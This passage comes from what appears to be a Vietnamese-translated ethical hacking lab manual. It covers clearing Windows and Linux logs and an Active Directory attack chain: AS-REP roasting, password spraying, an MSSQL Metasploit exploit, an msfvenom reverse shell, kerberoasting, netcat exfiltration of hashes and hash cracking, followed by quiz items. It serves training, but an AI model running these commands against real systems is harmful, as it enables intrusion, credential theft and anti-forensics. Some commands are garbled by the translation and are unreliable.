5.  Cửa sổ bật lên Kiểm soát tài khoản người dùng xuất hiện; nhấp vào Có.

6.  Cửa sổ Dấu nhắc lệnh với các đặc quyền của Quản trị viên sẽ xuất hiện. Chạy lệnh wevtutil el để hiển thị danh sách nhật ký sự kiện.

> **el \| enum-logs liệt kê tên nhật ký sự kiện.**

7.  Bây giờ, hãy chạy lệnh wevtutil cl \[log_name\] (ở đây, chúng tôi đang xóa nhật ký hệ thống) để xóa nhật ký sự kiện cụ thể.

> **cl \| clear-log: xóa nhật ký, log_name là tên của nhật ký cần xóa và ví dụ: là hệ thống, ứng dụng và bảo mật.**

8.  Tương tự, bạn cũng có thể xóa nhật ký ứng dụng và bảo mật bằng cách đưa ra cùng một lệnh với các tên nhật ký khác nhau (ứng dụng, bảo mật).

> wevtutil là một tiện ích dòng lệnh được sử dụng để truy xuất thông tin về nhật ký sự kiện và nhà xuất bản. Bạn cũng có thể sử dụng lệnh này để cài đặt và gỡ cài đặt các bảng kê khai sự kiện, chạy truy vấn cũng như xuất, lưu trữ và xóa nhật ký.

9.  Trong Dấu nhắc lệnh, hãy chạy lệnh cipher /w:\[Drive or Folder or File Location\] để ghi đè các tệp đã xóa trong một ổ đĩa, thư mục hoặc tệp cụ thể.

> Ở đây, chúng tôi đang mã hóa các tệp đã xóa trên ổ C: . Bạn có thể chạy tiện ích này trên ổ đĩa, thư mục hoặc tệp mà bạn chọn.

10. Tiện ích Cipher.exe bắt đầu ghi đè các tệp đã xóa, trước tiên, bằng tất cả các số 0 (0x00); thứ hai, với tất cả 255 giây (0xFF); và cuối cùng, với các số ngẫu nhiên, như trong ảnh chụp màn hình.

> Cipher.exe là một công cụ dòng lệnh Windows tích hợp sẵn, có thể được sử dụng để xóa một đoạn dữ liệu một cách an toàn bằng cách ghi đè lên nó để ngăn chặn khả năng phục hồi của nó. Lệnh này cũng hỗ trợ mã hóa và giải mã dữ liệu trong phân vùng NTFS.
>
> Khi kẻ tấn công tạo một tệp văn bản độc hại và mã hóa nó, tại thời điểm quá trình mã hóa, một tệp sao lưu sẽ được tạo. Vì vậy, trong trường hợp quá trình mã hóa bị gián đoạn, file sao lưu có thể được sử dụng để khôi phục dữ liệu. Sau khi hoàn tất quá trình mã hóa, tệp sao lưu sẽ bị xóa, nhưng tệp đã xóa này có thể được khôi phục bằng phần mềm khôi phục dữ liệu và nhân viên an ninh có thể sử dụng thêm để điều tra. Để tránh bị phục hồi dữ liệu và che đậy dấu vết, kẻ tấn công sử dụng công cụ Cipher.exe để ghi đè lên các tệp đã xóa.
>
> thêm\...

11. Nhấn ctrl+c trong dấu nhắc lệnh để dừng mã hóa.

> Thời gian ghi đè lên tập tin, thư mục hoặc ổ đĩa đã xóa tùy thuộc vào kích thước của nó.

12. Phần này kết thúc phần minh họa xóa nhật ký máy Windows bằng nhiều tiện ích khác nhau (Clear_Event_Viewer_Logs.bat, wevtutil và Cipher).

13. Đóng tất cả các cửa sổ đang mở và ghi lại tất cả thông tin thu được.

**Câu 6.4.1.1**

Trong máy Windows 11, hãy sử dụng nhiều tiện ích Windows khác nhau như Clear_Event_Viewer_Logs.bat, wevtutil và Cipher để xóa nhật ký hệ thống. Lệnh wevtutil nào sẽ xóa tất cả nhật ký hệ thống (nhập lệnh hoàn chỉnh làm câu trả lời)?

![](media/image12.wmf)

Nhiệm vụ 2: Xóa nhật ký máy Linux bằng BASH Shell

BASH hoặc Bourne Again Shell là một shell tương thích với sh, lưu trữ lịch sử lệnh trong một tệp có tên là lịch sử bash. Bạn có thể xem lịch sử lệnh đã lưu bằng lệnh more \~/.bash_history. Tính năng này của BASH là một vấn đề đối với tin tặc, vì các nhà điều tra có thể sử dụng tệp bash_history để theo dõi nguồn gốc của một cuộc tấn công và tìm hiểu các lệnh chính xác mà kẻ xâm nhập sử dụng để xâm phạm hệ thống.

Ở đây, chúng tôi sẽ xóa nhật ký sự kiện của máy Linux bằng trình bao BASH.

1.  Nhấp vào Bảo mật Vẹt để chuyển sang máy Bảo mật Vẹt.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

2.  Mở cửa sổ Terminal và chạy lệnh xuất HISTSIZE=0 để vô hiệu hóa trình bao BASH khỏi lưu lịch sử.

> **HISTSIZE: xác định số lượng lệnh sẽ được lưu, số này sẽ được đặt thành 0.**

3.  Trong cửa sổ terminal / dòng lệnh, hãy chạy lệnh lịch sử -c để xóa lịch sử đã lưu trữ.

> Lệnh này là một sự thay thế hiệu quả cho lệnh vô hiệu hóa lịch sử; với lịch sử -c, bạn có thể thuận tiện viết lại hoặc xem lại các lệnh đã sử dụng trước đó.

4.  Tương tự, bạn cũng có thể sử dụng lệnh history -w để xóa lịch sử của shell hiện tại, giữ nguyên lịch sử lệnh của các shell khác.

5.  Chạy lệnh shred \~/.bash_history để chia nhỏ tệp lịch sử, khiến nội dung của nó không thể đọc được.

> Lệnh này hữu ích trong trường hợp người điều tra định vị tệp; vì lệnh này, họ sẽ không thể đọc bất kỳ nội dung nào trong tệp lịch sử.

6.  Bây giờ, hãy chạy thêm \~/.bash_history lệnh để xem nội dung lịch sử đã được cắt nhỏ, như minh họa trong ảnh chụp màn hình.

7.  Nhập ctrl+z để ngừng xem nội dung lịch sử đã được cắt nhỏ.

> Thời gian băm nhỏ tập tin lịch sử phụ thuộc vào kích thước của tập tin.

8.  Bạn có thể sử dụng tất cả các lệnh nêu trên trong một lệnh duy nhất bằng cách phát hành shred \~/.bash_history && cat /dev/null \> .bash_history && history -c && exit.

9.  Lệnh này trước tiên sẽ cắt nhỏ tệp lịch sử, sau đó xóa nó và cuối cùng xóa bằng chứng về việc sử dụng lệnh này. Sau lệnh này, bạn sẽ thoát khỏi cửa sổ terminal.

10. Phần này kết thúc phần trình diễn cách xóa nhật ký máy Linux bằng shell BASH.

11. Đóng tất cả các cửa sổ đang mở và ghi lại tất cả thông tin thu được.

**Câu 6.4.2.1**

Trong máy Parrot Security, xóa nhật ký sự kiện của máy Linux bằng shell Bash. Lệnh nào sẽ vô hiệu hóa shell Bash lưu lịch sử?

Lab 5: Thực hiện tấn công Active Directory (AD) bằng nhiều công cụ khác nhau

**Kịch bản bài lab**

Các cuộc tấn công phạm vi Active Directory (AD) trong hack đạo đức liên quan đến việc khai thác các lỗ hổng trong cơ sở hạ tầng của AD. Các cuộc tấn công này có thể bao gồm việc dò mật khẩu, Kerberoasting và khai thác các cấu hình sai. Tin tặc có đạo đức sử dụng các kỹ thuật này để đánh giá tính bảo mật của tổ chức, xác định điểm yếu và đề xuất các cải tiến để bảo vệ khỏi các mối đe dọa trong thế giới thực và truy cập trái phép.

Là một hacker có đạo đức chuyên nghiệp, bạn cần biết cách thực hiện các cuộc tấn công AD khác nhau như phun mật khẩu, Kerberoasting, v.v., để có được quyền truy cập đặc quyền vào mạng AD.

**Mục tiêu bài lab**

-   Thực hiện quét lần đầu để lấy IP và tên miền của Bộ điều khiển miền

-   Thực hiện tấn công Roasting AS-REP

-   Xịt mật khẩu đã crack vào mạng bằng CrackMapExec

-   Thực hiện đếm sau bằng PowerView

-   Thực hiện tấn công dịch vụ MSSQL

-   Thực hiện leo thang đặc quyền

-   Thực hiện tấn công Kerberoasting

**Tổng quan về các cuộc tấn công AD**

Các cuộc tấn công AD liên quan đến việc khai thác các lỗ hổng trong AD để có được quyền truy cập trái phép, nâng cấp đặc quyền và đánh cắp dữ liệu nhạy cảm. Các kỹ thuật bao gồm bẻ khóa mật khẩu, tấn công Kerberos và khai thác các cấu hình sai. Là những hacker có đạo đức, bạn có thể sử dụng các phương pháp này để kiểm tra khả năng phòng thủ, xác định điểm yếu và tăng cường bảo mật cho cơ sở hạ tầng mạng của tổ chức.

Nhiệm vụ 1: Thực hiện quét lần đầu để lấy IP Domain Controller và tên miền

Quá trình quét ban đầu trong bảng liệt kê AD rất quan trọng vì nó xác định cấu trúc mạng, cổng mở và dịch vụ. Thông tin này giúp các hacker có đạo đức lập bản đồ môi trường AD, phát hiện các lỗ hổng và lên kế hoạch cho các cuộc tấn công có mục tiêu nhằm đánh giá các biện pháp bảo mật và xác định các điểm yếu tiềm ẩn.

Ở đây, chúng tôi đang sử dụng công cụ Nmap để thực hiện quét ban đầu trên bộ điều khiển miền (DC).

1.  Nhấp vào Bảo mật Vẹt để chuyển sang máy Bảo mật Vẹt. Mở cửa sổ terminal / dòng lệnh và thực thi sudo su để chạy các chương trình với tư cách là người dùng root (Khi được nhắc, hãy nhập mật khẩu).[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

2.  Bây giờ, hãy chạy lệnh cd để chuyển đến thư mục gốc.

3.  Thực thi lệnh nmap 10.10.1.0/24 để quét toàn bộ mạng con và xác định địa chỉ IP DC.

4.  Quan sát đầu ra nmap một cách cẩn thận. Ở đây, nmap hiển thị rằng máy chủ 10.10.1.22 có cổng 88/TCP kerberos-sec và cổng 389/TCP LDAP đã mở. Điều này xác nhận rằng địa chỉ IP DC của chúng tôi là 10.10.1.22.

5.  Bây giờ, chúng tôi sẽ quét 10.10.1.22 chi tiết hơn để có thêm thông tin. Thực thi lệnh nmap -A -sC -sV 10.10.1.22.

6.  Sau khi quét xong chúng ta sẽ có được tên miền là CEH.com.

7.  Bây giờ, chúng ta có IP DC và tên miền, có thể được sử dụng trong cuộc tấn công Roasting AS-REP.

8.  Đóng tất cả các cửa sổ đang mở và ghi lại tất cả thông tin thu được.

Nhiệm vụ 2: Thực hiện tấn công Roasting AS-REP

Một cuộc tấn công rang AS-REP nhắm vào các tài khoản người dùng trong AD không yêu cầu xác thực trước Kerberos, khai thác cài đặt DONT_REQ_PREAUTH. Những kẻ tấn công có thể yêu cầu vé cấp vé (TGT) cho các tài khoản này mà không cần mật khẩu của người dùng.

DC phản hồi bằng một TGT được mã hóa mà kẻ tấn công nắm bắt được. TGT này, được mã hóa bằng hàm băm mật khẩu của người dùng, sau đó sẽ được sử dụng các công cụ bẻ khóa mật khẩu ngoại tuyến như Hashcat hoặc John the Ripper. Bằng cách đoán nhanh mật khẩu, kẻ tấn công cuối cùng có thể giải mã TGT, tiết lộ mật khẩu của người dùng.

1.  Trong máy Parrot Security, hãy mở một cửa sổ Terminal mới và thực thi sudo su để chạy các chương trình với tư cách là người dùng root (Khi được nhắc, hãy nhập mật khẩu).

2.  Bây giờ, hãy chạy lệnh cd để chuyển đến thư mục gốc.

3.  Nhập cd impacket/examples/ và nhấn Enter để chuyển vào thư mục ví dụ.

4.  Thực thi lệnh python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22.

    -   **GetNPUsers.py: Tập lệnh Python để lấy thông tin người dùng AD.**

    -   **CEH.com/: Nhắm mục tiêu tên miền AD.**

    -   **-no-pass: Gắn cờ để tìm tài khoản người dùng không yêu cầu xác thực trước.**

    -   **-usersfile \~/ADtools/users.txt: Đường dẫn đến tệp có danh sách tài khoản người dùng.**

    -   **-dc-ip 10.10.1.22: Địa chỉ IP của DC cần truy vấn.**

5.  Chúng tôi có thể quan sát thấy rằng người dùng Joshua đã đặt DONT_REQUIRE_PREAUTH. Vì người dùng này dễ bị tấn công bởi AS-REP nên chúng tôi lấy được mật khẩu băm của Joshua.

6.  Sao chép hàm băm đó và lưu dưới dạng joshuahash.txt. Thực thi lệnh echo \'\[HASH\]\' \> joshuahash.txt.

7.  Thực thi lệnh john \--wordlist=/root/ADtools/rockyou.txt joshuahash.txt. Điều này sẽ bẻ khóa mật khẩu băm và sẽ cung cấp cho chúng tôi mật khẩu ở dạng văn bản thuần túy.

8.  Mật khẩu của người dùng Joshua đã bị bẻ khóa, như trong ảnh chụp màn hình ở trên là bánh cupcake.

9.  Đóng tất cả các cửa sổ đang mở và ghi lại tất cả thông tin thu được.

Nhiệm vụ 3: Xịt mật khẩu đã bẻ khóa vào mạng bằng CrackMapExec.

Sử dụng CrackMapExec để dò mật khẩu liên quan đến việc tận dụng khả năng của nó để tự động hóa quy trình. Ví dụ: nếu \"cupcake\" là mật khẩu bị bẻ khóa, CME có thể được sử dụng để kiểm tra mật khẩu này đối với nhiều tài khoản người dùng và dịch vụ trên mạng. Cách tiếp cận này giúp xác định các tài khoản khác có thể đang sử dụng cùng một mật khẩu, tạo điều kiện thuận lợi cho việc kiểm tra thâm nhập hoặc đánh giá bảo mật hơn nữa.

1.  Trong máy Parrot Security, hãy mở một cửa sổ Terminal mới và thực thi sudo su để chạy các chương trình với tư cách là người dùng root (Khi được nhắc, hãy nhập cả mật khẩu).

2.  Bây giờ, hãy chạy lệnh cd để chuyển đến thư mục gốc.

3.  Trong Lab 5: Nhiệm vụ 1, từ kết quả Nmap, chúng ta có thể quan sát thấy các máy chủ khác trong mạng con đang chạy các dịch vụ như RDP, SSH và FTP. Do đó, chúng tôi có thể thực hiện dò mật khẩu trên từng dịch vụ riêng lẻ để kiểm tra thông tin xác thực chính xác. Trong nhiệm vụ này, chúng tôi sẽ tập trung vào RDP. Tuy nhiên, bạn có thể khám phá và kiểm tra các dịch vụ khác.

4.  Thực thi lệnh cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p \"cupcake\" để thực hiện dò mật khẩu.

    -   **rdp: Nhắm mục tiêu dịch vụ Giao thức máy tính từ xa (RDP).**

    -   **10.10.1.0/24: Dải địa chỉ IP cần nhắm mục tiêu, bao gồm tất cả các máy chủ trong mạng con 10.10.1.0 với mặt nạ mạng con là 255.255.255.0.**

    -   **-u /root/ADtools/users.txt: Chỉ định đường dẫn đến file chứa tài khoản người dùng để xác thực.**

    -   **-p \"cupcake\": Mật khẩu mà chúng tôi đã bẻ khóa bằng cách sử dụng AS-REP Roasting để kiểm tra dịch vụ RDP trên các máy chủ được chỉ định.**

5.  Sau khi hoàn tất quá trình quét, chúng tôi nhận thấy rằng người dùng Mark đang sử dụng cùng một mật khẩu bánh nướng nhỏ trên máy chủ 10.10.1.40. Bây giờ chúng tôi sẽ cố gắng kết nối với RDP dưới dạng nhãn hiệu người dùng.

6.  Nhấp vào Menu và tìm kiếm remmina trong tệp tìm kiếm; sau đó chọn Remmina từ kết quả.

7.  Trong cửa sổ Remmina Remote Desktop Client , hãy nhập địa chỉ IP 10.10.1.40 để kết nối (10.10.1.40 là địa chỉ IP của máy ảo Windows 11 (AD)). Một lời nhắc xuất hiện yêu cầu Chấp nhận chứng chỉ? Nhấn vào có.

8.  Trong cửa sổ Nhập thông tin xác thực RDP, hãy nhập Đánh dấu vào trường Tên người dùng và bánh cupcake vào trường Mật khẩu; sau đó nhấp vào OK.

9.  Kết nối Máy tính Từ xa sẽ được thiết lập thành công với hệ thống đích.

10. Thu nhỏ cửa sổ Remmina.

Tác vụ 4: Thực hiện đếm sau bằng PowerView

PowerView là một công cụ PowerShell được thiết kế để liệt kê mạng và AD. Nó giúp các chuyên gia bảo mật thu thập thông tin chi tiết về tài khoản người dùng, nhóm, máy tính và độ tin cậy của miền. PowerView được sử dụng để xác định các điểm yếu bảo mật tiềm ẩn và cấu hình sai trong môi trường AD. Nó thường được sử dụng trong thử nghiệm thâm nhập và hoạt động của đội đỏ.

1.  Trong terminal / dòng lệnh, hãy thực thi lệnh cd /root/ADtools để di chuyển vào thư mục ADtools.

2.  Tiếp theo, chúng tôi sẽ cố gắng điều tra sau để thu thập thông tin bổ sung về AD.

3.  Đối với mục đích liệt kê, chúng tôi sẽ sử dụng tập lệnh PowerView.ps1. Chúng tôi sẽ lưu trữ một máy chủ Python trên máy tấn công của mình để chia sẻ tập lệnh này và sau đó chúng tôi sẽ tải nó xuống máy Windows 11 (Mark) bằng phiên RDP.

4.  Nhập python3 -m http.server trong terminal / dòng lệnh và nhấn Enter để khởi động máy chủ HTTP.

5.  Sau khi khởi động máy chủ HTTP, hãy quay lại Remmina nơi phiên RDP của chúng tôi đang hoạt động. Sau đó, mở trình duyệt Firefox và điều hướng đến URL http://10.10.1.13:8000/PowerView.ps1 để tự động tải xuống tập lệnh PowerView.ps1. Đóng cửa sổ trình duyệt Firefox.

6.  Sau khi tải xuống tập lệnh, hãy khởi chạy PowerShell bằng cách tìm kiếm tập lệnh đó trong tùy chọn tìm kiếm của Windows.

7.  Điều hướng đến thư mục Tải xuống bằng cách chạy lệnh cd Tải xuống. Trước khi tải tập lệnh, hãy chạy lệnh powershell -EP Bypass để bật thực thi tập lệnh.

8.  Bây giờ, hãy thực thi lệnh . .\\PowerView.ps1 để tải tập lệnh PowerView.ps1 trong PowerShell.

9.  Tiếp theo, thực thi lệnh Get-NetComputer trong PowerShell. Lệnh này sẽ hiển thị tất cả các thông tin liên quan đến máy tính trong AD. Nó liệt kê tất cả các đối tượng máy tính trong AD, có thể giúp xác định các mục tiêu mạng và ánh xạ môi trường AD.

10. Bây giờ, hãy thực thi Get-NetGroup trong PowerShell. Lệnh Get-NetGroup trong PowerView liệt kê tất cả các nhóm trong AD, giúp xác định tư cách thành viên nhóm và các mục tiêu tiềm năng để leo thang đặc quyền.

11. Thực thi lệnh Get-NetUser trong PowerShell. Get-NetUser trong PowerView truy xuất thông tin chi tiết về tài khoản người dùng AD, chẳng hạn như tên người dùng và tư cách thành viên nhóm. Nó giúp xác định các mục tiêu tiềm năng và hiểu rõ hơn về môi trường AD.

12. Trong quá trình liệt kê người dùng, chúng tôi đã tìm thấy một người dùng mới SQL_srv, người này có một số đặc quyền cao và có thể hữu ích cho các cuộc tấn công tiếp theo. Trong nhiệm vụ tiếp theo, chúng ta sẽ tấn công người dùng SQL_srv có dịch vụ SQL chạy trên đó.

13. Dưới đây là một số lệnh được liệt kê khác mà bạn có thể sử dụng với PowerView.ps1 để liệt kê:

    -   **Get-NetOU - Liệt kê tất cả các đơn vị tổ chức (OU) trong miền.**

    -   **Get-NetSession - Liệt kê các phiên hoạt động trên miền.**

    -   **Get-NetLoggedon - Liệt kê người dùng hiện đang đăng nhập vào máy.**

    -   **Get-NetProcess - Liệt kê các quy trình đang chạy trên máy miền.**

    -   **Get-NetService - Liệt kê các dịch vụ trên máy miền.**

    -   **Get-NetDomainTrust - Liệt kê các mối quan hệ tin cậy của miền.**

    -   **Get-ObjectACL - Truy xuất ACL cho một đối tượng được chỉ định.**

    -   **Find-InterestingDomainAcl - Tìm các ACL thú vị trong miền.**

    -   **Get-NetSPN - Liệt kê tên chính của dịch vụ (SPN) trong miền.**

    -   **Invoke-ShareFinder - Tìm các thư mục được chia sẻ trong miền.**

    -   **Invoke-UserHunter - Tìm nơi đăng nhập của quản trị viên miền.**

    -   **Invoke-CheckLocalAdminAccess - Kiểm tra xem người dùng hiện tại có quyền truy cập quản trị viên cục bộ trên các máy được chỉ định hay không.**

14. Trước khi tiếp tục nhiệm vụ tiếp theo, hãy khởi động lại máy Parrot Security.

Nhiệm vụ 5: Thực hiện tấn công dịch vụ MSSQL

**xp_cmdshell là một thủ tục lưu trữ trên máy chủ SQL cho phép thực thi shell lệnh. Xp_cmdshell bị định cấu hình sai có thể dẫn đến việc thực thi lệnh tùy ý, lọc dữ liệu và tiềm ẩn nguy cơ xâm phạm mạng, gây ra rủi ro bảo mật đáng kể. Các biện pháp bảo mật và cấu hình phù hợp là rất quan trọng để giảm thiểu những rủi ro này.**

1.  Trong quá trình quét Nmap, chúng tôi nhận thấy rằng máy chủ 10.10.1.30 (là máy ảo Windows Server 2019 (AD)) có cổng 1433 mở. Chúng tôi sẽ cố gắng ép buộc mật khẩu bằng cách sử dụng Hydra vì chúng tôi đã biết tên người dùng là SQL_srv.

2.  Trong máy Parrot Security đăng nhập bằng thông tin xác thực của kẻ tấn công/toor.Mở một cửa sổ terminal / dòng lệnh mới và thực thi sudo su để chạy các chương trình với tư cách là người dùng root (Khi được nhắc, hãy nhập mật khẩu toor).

3.  Lưu tên người dùng SQL_srv trong tệp văn bản và đặt tên là user.txt bằng lệnh pluma user.txt.

4.  Thực thi lệnh hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql để ép buộc mật khẩu dịch vụ MSSQL.

5.  Chúng tôi đã bẻ khóa thành công mật khẩu cho SQL_srv, đó là \"batman\". Tiếp theo, chúng tôi sẽ thử đăng nhập vào dịch vụ bằng cách sử dụng mssqlclient.py.

6.  Thực thi lệnh python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433.

> Lưu ý tên cơ sở dữ liệu ở đây là \"master\".

7.  Thực thi truy vấn SQL CHỌN tên, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name=\'xp_cmdshell\';, trả về giá trị 1, cho biết rằng xp_cmdshell được bật trên máy chủ.

8.  Bây giờ, khi biết rằng xp_cmdshell được bật trên máy chủ SQL, chúng ta có thể sử dụng Metasploit để khai thác dịch vụ này. Nhập thoát và nhấn Enter; sau đó thực thi lệnh msfconsole để khởi chạy Metasploit.

9.  Thực hiện các lệnh sau:

    -   **sử dụng khai thác/windows/mssql/mssql_payload**

    -   **đặt RHOST 10.10.1.30**

    -   **đặt TÊN NGƯỜI DÙNG SQL_srv**

    -   **đặt MẬT KHẨU Batman**

    -   **đặt cơ sở dữ liệu chính**

10. Sau khi đã định cấu hình tất cả các lệnh, hãy nhập khai thác và nhấn Enter.

11. Sau khi quá trình khai thác hoàn tất, chúng ta sẽ nhận được phiên Meterpreter như trong ảnh chụp màn hình.

12. Nhập lệnh shell và nhấn Enter. Thực thi lệnh whoami để xác định tên người dùng của người dùng hiện đang đăng nhập. Ở đây, \$sqlexpress là dịch vụ SQL.

Nhiệm vụ 6: Thực hiện nâng cao đặc quyền

WinPEASx64.exe là một công cụ để leo thang đặc quyền của Windows, xác định các cấu hình sai và các lỗ hổng có thể bị khai thác.

Lỗ hổng Đường dẫn dịch vụ không trích dẫn trong khóa đăng ký RunOnce phát sinh khi đường dẫn dịch vụ Windows thiếu dấu ngoặc kép thích hợp và chứa khoảng trắng, cho phép kẻ tấn công thực thi mã tùy ý với các đặc quyền nâng cao trong quá trình khởi động hệ thống.

1.  Để thực hiện các cuộc tấn công tiếp theo, chúng tôi cần có đặc quyền cao. Để leo thang đặc quyền, chúng tôi sẽ sử dụng WinPEAS.exe để liệt kê mọi cấu hình sai.

2.  Chúng tôi sẽ tải tệp WinPEAS.exe lên và thực thi nó trong Windows.

3.  Di chuyển đến C:\\ bằng lệnh cd C:\\.

4.  Tiếp theo, di chuyển đến C:\\Users\\Public\\Downloads bằng cách sử dụng cd và thực thi lệnh powershell.

5.  Bây giờ, chúng ta cần lưu trữ winPEASx64.exe trên máy tấn công bằng Python. Mở một terminal / dòng lệnh mới, nhập sudo su, nhấn Enter và sử dụng toor làm mật khẩu. Thực thi lệnh cd /root/ADtools.

6.  Nhập python3 -m http.server và nhấn Enter để lưu trữ tệp winPEASx64.exe.

7.  Quay lại terminal / dòng lệnh shell và nhập wget http://10.10.1.13:8000/winPEASx64.exe -o winpeas.exe.

> Không kết thúc máy chủ Python

8.  Sau khi tải xuống winpeas.exe, hãy thực thi nó bằng ./winpeas.exe.

9.  Việc thực thi tập lệnh bắt đầu; đợi cho đến khi quá trình thực thi hoàn tất.

10. Sau khi thực hiện xong, hãy quan sát kết quả. Ở đây, chúng tôi có một tệp có tên file.exe trong C:\\Program Files\\CEH Services không được trích dẫn và có thể bị lợi dụng để leo thang đặc quyền.

11. Mở một terminal / dòng lệnh mới có quyền root bằng lệnh sudo su và toor làm mật khẩu. Thực thi lệnh msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=8888 -f exe \> /root/ADtools/file.exe.

12. Quay lại shell terminal của chúng tôi và di chuyển đến C:\\Program Files\\CEH Services. Thực thi lệnh cd ../../.. ; cd \"Tệp chương trình/Dịch vụ CEH\".

13. Thực hiện lệnh di chuyển file.exe file.bak ; quên http://10.10.1.13:8000/file.exe -o file.exe.

14. Bây giờ, hãy chuyển đến một terminal / dòng lệnh khác rồi nhập nc -nvlp 8888 rồi nhấn Enter.

15. Nhấp vào Windows Server 2019 (AD) để chuyển sang máy Windows Server 2019 (AD), giả sử chúng ta hiện là nạn nhân. Khởi động lại máy bằng cách di chuột qua nút Nguồn và Hiển thị rồi nhấp vào nút Đặt lại/Khởi động lại có trên thanh công cụ phía trên máy ảo và đăng nhập bằng tên người dùng SQL_srv và mật khẩu \"batman\".[Windows Server 2019 (AD)](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

> Trong cửa sổ Đặt lại/Khởi động lại máy, hãy nhấp vào Có.

16. Sau khi đăng nhập, hãy quay lại Bảo mật Vẹt. Ở đây, chúng ta đã có shell cho trình nghe netcat của mình. Đó là một vỏ đặc quyền.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

17. Thực thi lệnh whoami xác định tên người dùng của người dùng hiện đang đăng nhập.

Nhiệm vụ 7: Thực hiện tấn công Kerberoasting

Rubeus là công cụ khai thác điểm yếu của Kerberos trong môi trường Windows. Kerberoasting là một phương pháp trích xuất các giá trị băm của vé cấp vé (TGT) từ AD. Những kẻ tấn công nhắm mục tiêu vào các tài khoản dịch vụ có tên chính của dịch vụ Kerberos (SPN) được liên kết. TGT được DC yêu cầu cho các tài khoản này, sau đó bẻ khóa ngoại tuyến để tiết lộ mật khẩu người dùng. Kerberoasting khai thác mật khẩu tài khoản dịch vụ yếu và bản chất của xác thực Kerberos.

1.  Trong netcat shell, hãy thực thi lệnh powershell để khởi chạy PowerShell.

2.  Điều hướng đến C:\\Users\\Public\\Downloads và thực thi lệnh cd ../.. ; cd Người dùng\\Công cộng\\Tải xuống.

3.  Bây giờ chúng ta sẽ tải Rubeus và netcat xuống. Thực thi lệnh wget http://10.10.1.13:8000/Rubeus.exe -o rubeus.exe ; quên http://10.10.1.13:8000/ncat.exe -o ncat.exe. Sau khi tải xuống xong các công cụ, hãy nhập thoát và nhấn Enter.

4.  Nhập cd ../.. && cd Users\\Public\\Downloads và nhấn Enter để di chuyển vào thư mục Tải xuống.

5.  Thực thi lệnh rubeus.exe kerberoast /outfile:hash.txt.

6.  Sau khi tăng cường dữ liệu, hàm băm mật khẩu cho DC-Admin được lưu trong tệp hash.txt.

7.  Để lấy tệp băm đó trên máy tấn công, chúng tôi sẽ sử dụng netcat. Mở một terminal / dòng lệnh mới, nhập sudo su và nhấn Enter; sử dụng toor làm mật khẩu. Sau đó thực thi lệnh nc -lvp 9999 \> hash.txt .

8.  Trong terminal / dòng lệnh shell, thực thi lệnh ncat.exe -w 3 10.10.1.13 9999 \< hash.txt.

9.  Quay lại terminal / dòng lệnh của trình nghe netcat và nhấn Enter để lưu tệp.

10. Bây giờ, chúng tôi sẽ sử dụng HashCat để bẻ khóa hàm băm mật khẩu. Thực thi lệnh hashcat -m 13100 \--force -a 0 hash.txt /root/ADtools/rockyou.txt.

    -   -m 13100: Điều này chỉ định loại băm. 13100 tương ứng với Kerberos 5 AS-REQ Pre-Auth etype 23 (RC4-HMAC), một định dạng cụ thể cho hàm băm Kerberos.

    -   \--force: Tùy chọn này buộc Hashcat bỏ qua cảnh báo và chạy ngay cả khi có vấn đề về tương thích. Hãy thận trọng khi sử dụng phương pháp này vì nó có thể gây ra sự mất ổn định hoặc kết quả không chính xác.

    -   -a 0: Điều này chỉ định chế độ tấn công. 0 là viết tắt của một cuộc tấn công thẳng, đây là một cuộc tấn công từ điển đơn giản trong đó Hashcat thử từng mật khẩu trong từ điển.

    -   hash.txt: là file đầu vào chứa các hash cần crack

    -   /root/ADtools/rockyou.txt: là file wordlist dùng để tấn công

11. Sau khi hoàn thành, chúng ta sẽ nhận được mật khẩu nâng cao!. Vì DC-Admin có đặc quyền cao trên miền nên chúng tôi có thể sử dụng mật khẩu này cho các cuộc tấn công tiếp theo.

12. Điều này kết thúc phần trình diễn thực hiện tấn công AD.

13. Đóng tất cả các cửa sổ đang mở và ghi lại tất cả thông tin thu được.

**Câu 6.5.7.1**

Sử dụng máy Parrot Security để xác định Bộ điều khiển miền trong mạng mục tiêu 10.10.1.0/24 và thực hiện rang AS-REP trên Windows Server 2022 (10.10.1.22) để thu thập người dùng Joshua. Thực hiện dò mật khẩu trên mạng con để xác định người dùng có cùng mật khẩu trên mạng con. Kết nối với tài khoản người dùng đã bị xâm phạm trong quá trình dò ​​mật khẩu và sử dụng PowerView để thực hiện liệt kê và khai thác người dùng SQL_srv được liệt kê bằng PowerView để có được quyền truy cập đặc quyền vào miền và thực hiện kerberoasting trên Bộ điều khiển miền đích (Windows Server 2022) để lấy mật khẩu của DC-Admin. Nhập mật khẩu của người dùng DC-Admin có được sau khi kerberoasting

Lab 6: Thực hiện hack hệ thống bằng AI

**Kịch bản bài lab**

Với tư cách là một hacker có đạo đức hoặc chuyên gia kiểm thử xâm nhập (pentester), bước đầu tiên trong quá trình hack hệ thống là giành quyền truy cập vào hệ thống mục tiêu bằng cách sử dụng thông tin thu được và các lỗ hổng được tìm thấy trong cơ chế kiểm soát truy cập của hệ thống. Trong bài lab này, bạn sẽ tận dụng các công cụ AI để xác định các lỗ hổng và khai thác chúng để có quyền truy cập vào hệ thống mục tiêu. Bạn sẽ sử dụng nhiều kỹ thuật khác nhau như tạo tải trọng và thiết lập phiên với máy từ xa để đạt được điều này.

**Mục tiêu bài lab**

-   Thực hiện hack hệ thống bằng ShellGPT

**Tổng quan về Hack hệ thống bằng AI**

